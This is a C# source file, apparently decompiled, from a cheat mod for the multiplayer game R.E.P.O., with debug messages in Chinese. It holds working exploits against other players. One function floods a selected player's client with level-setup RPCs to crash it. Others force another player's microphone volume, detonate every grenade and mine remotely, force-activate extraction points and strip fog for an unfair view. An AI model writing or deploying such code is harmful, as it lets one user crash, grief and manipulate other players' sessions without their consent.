using System;
using System.Collections.Generic;
using System.Reflection;
using System.Text.RegularExpressions;
using Photon.Pun;
using Photon.Realtime;
using UnityEngine;

namespace r.e.p.o_cheat;

internal class MiscFeatures
{
	private static float previousFarClip;

	public static bool NoFogEnabled;

	public static void ToggleNoFog()
	{
		Camera main = GameHelper.GetActiveCamera();
		if ((Object)(object)main == (Object)null)
		{
			return;
		}
		if (NoFogEnabled)
		{
			if (previousFarClip == 0f)
			{
				previousFarClip = main.farClipPlane;
			}
			main.farClipPlane = 500f;
			RenderSettings.fog = false;
		}
		else
		{
			if (previousFarClip > 0f)
			{
				main.farClipPlane = previousFarClip;
			}
			RenderSettings.fog = true;
		}
	}

	private static string StripRichTextTags(string name)
	{
		return Regex.Replace(name, "<color=.*?>(.*?)<\\/color> ", "");
	}

	public static void ForcePlayerMicVolume(int volume)
	{
		if (Hax2.selectedPlayerIndex < 0 || Hax2.selectedPlayerIndex >= Hax2.playerList.Count)
		{
			Debug.Log((object)"玩家索引无效！");
			return;
		}
		if (Hax2.playerList[Hax2.selectedPlayerIndex] == null)
		{
			Debug.Log((object)"所选玩家为空！");
			return;
		}
		string text = StripRichTextTags(Hax2.playerNames[Hax2.selectedPlayerIndex]);
		Debug.Log((object)("正在搜索属于 '" + text + "' 的 PlayerVoiceChat"));
		PlayerVoiceChat[] array = Object.FindObjectsOfType<PlayerVoiceChat>();
		foreach (PlayerVoiceChat val in array)
		{
			if (StripRichTextTags(((Component)val).GetComponent<PhotonView>().Owner.NickName) == text)
			{
				Debug.Log((object)("已找到 " + text + " 的 PlayerVoiceChat，位于 " + ((Object)((Component)val).gameObject).name + "！"));
				PhotonView component = ((Component)val).GetComponent<PhotonView>();
				if ((Object)(object)component == (Object)null)
				{
					Debug.LogError((object)"在 PlayerVoiceChat 的 GameObject 上未找到 PhotonView！");
					return;
				}
				Debug.Log((object)$"正在将 {text} 的麦克风音量设置为 {volume}");
				component.RPC("MicrophoneVolumeSettingRPC", (RpcTarget)0, new object[1] { volume });
				Debug.Log((object)$"已将 {text} 的麦克风音量设置为 {volume}！");
				return;
			}
		}
		Debug.LogError((object)("未找到与 '" + text + "' 匹配的 PlayerVoiceChat！"));
	}

	public static void CrashSelectedPlayerNew()
	{
		try
		{
			if (Hax2.selectedPlayerIndex < 0 || Hax2.selectedPlayerIndex >= Hax2.playerList.Count)
			{
				Debug.Log((object)"玩家索引无效！");
				return;
			}
			object obj = Hax2.playerList[Hax2.selectedPlayerIndex];
			if (obj == null)
			{
				Debug.Log((object)"所选玩家为空！");
				return;
			}
			Debug.Log((object)("正在尝试让 " + Hax2.playerNames[Hax2.selectedPlayerIndex] + " 崩溃……"));
			FieldInfo field = obj.GetType().GetField("photonView", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
			if (field == null)
			{
				Debug.Log((object)"未找到 PhotonView 字段！");
				return;
			}
			object value = field.GetValue(obj);
			PhotonView val = (PhotonView)((value is PhotonView) ? value : null);
			if ((Object)(object)val == (Object)null)
			{
				Debug.Log((object)"PhotonView 为 null！");
				return;
			}
			Player owner = val.Owner;
			if (owner == null)
			{
				Debug.Log((object)"无法从 PhotonView 获取 Photon 玩家信息！");
				return;
			}
			LevelGenerator val2 = Object.FindObjectOfType<LevelGenerator>();
			if ((Object)(object)val2 == (Object)null)
			{
				Debug.LogError((object)"[KickExploit] 未找到 LevelGenerator 的 PhotonView。");
				return;
			}
			for (int i = 0; i < 5000; i++)
			{
				Random.Range(0, 9999);
				val2.PhotonView.RPC("ItemSetup", owner, Array.Empty<object>());
				val2.PhotonView.RPC("NavMeshSetupRPC", owner, Array.Empty<object>());
			}
		}
		catch (Exception ex)
		{
			Debug.Log((object)("让 " + Hax2.playerNames[Hax2.selectedPlayerIndex] + " 崩溃时出错：" + ex.Message));
		}
	}

	public static void ForceActivateAllExtractionPoints()
	{
		NativeGameApi.RequestActivateExtraction();
	}

	public static void ExlploadAll()
	{
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Unknown result type (might be due to invalid IL or missing references)
		ItemGrenade[] array = Object.FindObjectsOfType<ItemGrenade>();
		foreach (ItemGrenade obj in array)
		{
			MethodInfo method = typeof(ItemGrenade).GetMethod("TickStartRPC", BindingFlags.Instance | BindingFlags.NonPublic);
			if (method != null)
			{
				method.Invoke(obj, new object[0]);
				MethodInfo method2 = typeof(ItemGrenade).GetMethod("TickEndRPC", BindingFlags.Instance | BindingFlags.NonPublic);
				if (method2 != null)
				{
					method2.Invoke(obj, new object[0]);
				}
			}
		}
		ItemMine[] array2 = Object.FindObjectsOfType<ItemMine>();
		for (int i = 0; i < array2.Length; i++)
		{
			array2[i].StateSetRPC(4, default(PhotonMessageInfo));
		}
	}
}
